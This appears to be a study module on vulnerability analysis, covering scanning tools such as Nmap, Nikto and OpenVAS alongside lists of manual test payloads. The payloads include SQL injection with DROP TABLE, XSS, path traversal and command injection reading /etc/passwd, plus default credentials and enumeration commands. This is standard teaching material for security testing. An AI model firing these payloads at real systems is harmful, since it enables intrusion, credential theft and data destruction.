# Vulnerability Analysis - Topics Overview

## Topic Explanation
Vulnerability Analysis is a systematic process of identifying, quantifying, and prioritizing security vulnerabilities in computer systems, networks, and applications. It involves comprehensive examination, discovery, and assessment of security weaknesses that could be exploited by attackers. This module covers vulnerability assessment methodologies, scoring systems, common vulnerabilities databases, and automated scanning tools used to detect and assess security flaws.

## Articles for Further Reference
- [NIST Special Publication 800-40: Creating a Patch and Vulnerability Management Program](https://csrc.nist.gov/publications/detail/sp/800-40/rev-3/final)
- [OWASP Vulnerability Management Guide](https://owasp.org/www-community/Vulnerability_Management)
- [SANS Institute: Vulnerability Assessment](https://www.sans.org/white-papers/1364/)
- [CVE Program Overview](https://cve.mitre.org/about/index.html)
- [CVSS v3.1 Specification Document](https://www.first.org/cvss/v3.1/specification-document)

## Reference Links
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [CVE Details](https://www.cvedetails.com/)
- [Exploit Database](https://exploit-db.com/)
- [Common Weakness Enumeration (CWE)](https://cwe.mitre.org/)
- [FIRST.org - CVSS Resources](https://www.first.org/cvss/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

## Available Tools for the Topic

### Tool Name: Nmap (Network Mapper)
**Description:** A powerful network discovery and security auditing tool that can detect open ports, running services, operating systems, and potential vulnerabilities using NSE (Nmap Scripting Engine) scripts.

**Example Usage:**
```bash
# Basic vulnerability scan using Nmap scripts
nmap --script vuln target-ip

# Scan for specific vulnerabilities
nmap --script smb-vuln-ms17-010 target-ip

# Comprehensive vulnerability scan
nmap -sV --script vulners target-ip
```

**Reference Links:**
- [Official Nmap Website](https://nmap.org/)
- [Nmap NSE Scripts](https://nmap.org/nsedoc/)

### Tool Name: Nikto
**Description:** An open-source web vulnerability scanner that performs comprehensive tests against web servers for multiple items including over 6700 potentially dangerous files/programs, checks for outdated versions, and specific version problems.

**Example Usage:**
```bash
# Basic web vulnerability scan
nikto -h http://target-website.com

# Scan with specific plugins
nikto -h target-ip -Plugins @@ALL

# Output results to file
nikto -h target-ip -o results.txt
```

**Reference Links:**
- [Nikto Official Documentation](https://cirt.net/Nikto2)

### Tool Name: Nessus
**Description:** A comprehensive vulnerability assessment tool that can detect vulnerabilities, configuration issues, and malware across various platforms including networks, operating systems, hypervisors, databases, and web applications.

**Example Usage:**
```bash
# Create a new scan policy
# Configure target hosts and scan settings
# Run vulnerability assessment
# Generate detailed reports with remediation recommendations
```

**Reference Links:**
- [Tenable Nessus](https://www.tenable.com/products/nessus)

### Tool Name: OpenVAS
**Description:** A full-featured vulnerability scanner and management solution that provides extensive testing capabilities for security vulnerabilities.

**Example Usage:**
```bash
# Start OpenVAS services
sudo gvm-start

# Access web interface at https://localhost:9392
# Create targets and scan configurations
# Execute vulnerability scans
```

**Reference Links:**
- [Greenbone OpenVAS](https://www.openvas.org/)

### Tool Name: Qualys VMDR
**Description:** Cloud-based vulnerability management platform that provides continuous monitoring, vulnerability assessment, and remediation prioritization.

**Example Usage:**
- Configure asset discovery
- Schedule regular vulnerability scans
- Review and prioritize findings
- Track remediation progress

**Reference Links:**
- [Qualys VMDR](https://www.qualys.com/apps/vulnerability-management/)

## All Possible Payloads for Manual Approach

### Web Application Vulnerability Testing Payloads
```
# SQL Injection Test Payloads
' OR '1'='1
' OR 1=1--
' UNION SELECT null,null,null--
'; DROP TABLE users;--

# Cross-Site Scripting (XSS) Payloads
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
javascript:alert('XSS')

# Local File Inclusion (LFI) Payloads
../../../../etc/passwd
../../../../windows/system32/drivers/etc/hosts
..\..\..\..\boot.ini

# Command Injection Payloads
; cat /etc/passwd
| whoami
& dir
`id`

# LDAP Injection Payloads
*)(uid=*))(|(uid=*
*)(cn=*))(|(cn=*
```

### Network Service Testing Payloads
```
# FTP Anonymous Login Test
anonymous:anonymous@domain.com
ftp:ftp
guest:guest

# SNMP Community Strings
public
private
admin
manager
read
write

# Default Credentials Testing
admin:admin
admin:password
root:root
administrator:password
sa:sa
```

### Directory and File Discovery Payloads
```
# Common directories
/admin/
/administrator/
/backup/
/config/
/database/
/logs/
/test/
/temp/
/uploads/

# Common files
robots.txt
sitemap.xml
.htaccess
config.php
database.sql
backup.zip
```

## Example Payloads

### 1. Automated Vulnerability Scanning
```bash
# Nmap vulnerability detection
nmap -sV --script=vuln,safe,discovery target-range

# Nikto web server scanning
nikto -h http://target.com -C all -Format htm -output results.html

# Custom vulnerability assessment script
#!/bin/bash
TARGET=$1
echo "Starting vulnerability assessment for $TARGET"
nmap -sS -O -sV --script vuln $TARGET
nikto -h http://$TARGET
dirb http://$TARGET /usr/share/wordlists/dirb/common.txt
```

### 2. Manual Vulnerability Verification
```bash
# Test for specific CVE vulnerabilities
curl -X GET "http://target.com/cgi-bin/test-cgi" # CGI vulnerabilities
telnet target.com 21 # FTP banner grabbing
nc -nv target.com 22 # SSH banner grabbing

# SSL/TLS vulnerability testing
sslscan target.com
testssl.sh target.com

# SMB vulnerability testing
smbclient -L //target.com
enum4linux target.com
```

### 3. Database Vulnerability Assessment
```sql
-- MySQL vulnerability checks
SELECT version(); -- Version disclosure
SHOW DATABASES; -- Database enumeration
SELECT user,password FROM mysql.user; -- User enumeration

-- PostgreSQL vulnerability checks
SELECT version(); -- Version information
\l -- List databases
\du -- List users and roles
```

### 4. Active Directory Vulnerability Assessment
```powershell
# PowerShell AD enumeration
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter *
Get-ADComputer -Filter *

# BloodHound data collection
.\SharpHound.exe -c all
```

### 5. Cloud Security Assessment Payloads
```bash
# AWS S3 bucket enumeration
aws s3 ls s3://bucket-name --no-sign-request

# Azure blob storage testing
az storage blob list --account-name storageaccount --container-name container

# Google Cloud Storage testing
gsutil ls gs://bucket-name
```

## Vulnerability Assessment Life-Cycle Implementation

### 1. Discovery Phase
```bash
# Network discovery
nmap -sn target-network/24
masscan -p1-10000 target-network/24

# Service enumeration
nmap -sV -sC target-ip
```

### 2. Prioritization Framework
- **Critical (9.0-10.0):** Remote code execution, privilege escalation
- **High (7.0-8.9):** Data disclosure, authentication bypass
- **Medium (4.0-6.9):** Information disclosure, DoS conditions
- **Low (0.1-3.9):** Minor information leakage

### 3. Reporting Template
```markdown
## Vulnerability Report
**CVE ID:** CVE-YYYY-NNNN
**CVSS Score:** X.X
**Severity:** High/Medium/Low
**Affected Systems:** [List of systems]
**Description:** [Detailed vulnerability description]
**Impact:** [Potential business impact]
**Recommendation:** [Remediation steps]
**Timeline:** [Suggested remediation timeline]
```

### 4. Verification Techniques
```bash
# Re-scan after remediation
nmap --script vuln target-ip
nikto -h http://target.com -until 2024-01-01

# Compliance checking
nmap --script ssl-enum-ciphers target-ip
testssl.sh --protocols target.com
```